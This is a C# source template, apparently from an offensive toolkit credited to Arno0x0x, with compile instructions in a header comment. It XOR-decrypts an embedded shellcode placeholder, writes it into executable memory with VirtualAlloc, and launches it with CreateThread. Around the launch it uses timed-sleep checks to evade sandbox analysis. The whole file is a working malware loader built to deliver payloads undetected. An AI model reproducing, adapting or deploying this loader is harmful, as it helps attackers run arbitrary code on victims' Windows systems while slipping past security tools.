/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x32 /out:encryptedShellcodeWrapper_${cipherType}.exe encryptedShellcodeWrapper_${cipherType}.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:encryptedShellcodeWrapper_${cipherType}.exe encryptedShellcodeWrapper_${cipherType}.cs

*/

using System;
using System.Text;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        //==============================================================================
        // CRYPTO FUNCTIONS
        //==============================================================================
        private static byte[] xor(byte[] cipher, byte[] key) {
            byte[] decrypted = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++) {
                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }

        //==============================================================================
        // MAIN FUNCTION
        //==============================================================================
        static void Main()
        {
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] encryptedShellcode = new byte[] { ${shellcode} };
            string key = "${key}";

            //--------------------------------------------------------------
            // Decrypt the shellcode
            byte[] shellcode = null;
            shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));

            //--------------------------------------------------------------        	
            // Copy decrypted shellcode to memory
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            //UInt32 funcAddr = VirtualAlloc(0, 0x1000, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, pinfo, 0, IntPtr.Zero);

            DateTime t3 = DateTime.Now;
            Sleep(5000);
            double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
            if (t4 < 1.5)
            {
                return;
            }
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern void Sleep(uint dwMilliseconds);

        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
